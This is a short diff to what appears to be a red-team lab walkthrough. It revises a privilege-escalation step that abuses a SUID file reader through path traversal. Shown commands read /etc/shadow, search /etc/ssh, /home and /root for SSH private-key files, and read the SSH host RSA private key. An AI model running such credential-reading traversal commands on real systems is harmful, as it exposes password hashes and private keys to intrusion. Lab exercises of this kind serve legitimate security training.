@@ -118,12 +118,21 @@ safereader "/opt/archive/../../../etc/shadow"
 
 ![Path traversal reads /etc/shadow](screenshots/m5_red_09_shadow_traversal.png)
 
+The live host has no `/root/.ssh/id_rsa`, so identify an existing SSH private-key
+file before using the SUID reader:
+
 ```bash
-# Read SSH private keys
-safereader "/opt/archive/../../../root/.ssh/id_rsa"
+find /etc/ssh /home /root -type f \( -name 'id_*' -o -name 'ssh_host_*_key' \) 2>/dev/null | head -n 20
 ```
 
-![SSH key traversal test](screenshots/m5_red_10_ssh_key_traversal.png)
+![Available SSH private-key paths](screenshots/m5_red_10_key_discovery.png)
+
+```bash
+# Read an SSH host private key
+safereader "/opt/archive/../../../etc/ssh/ssh_host_rsa_key"
+```
+
+![SSH host-key traversal](screenshots/m5_red_10_ssh_key_traversal.png)
 
 ---
 
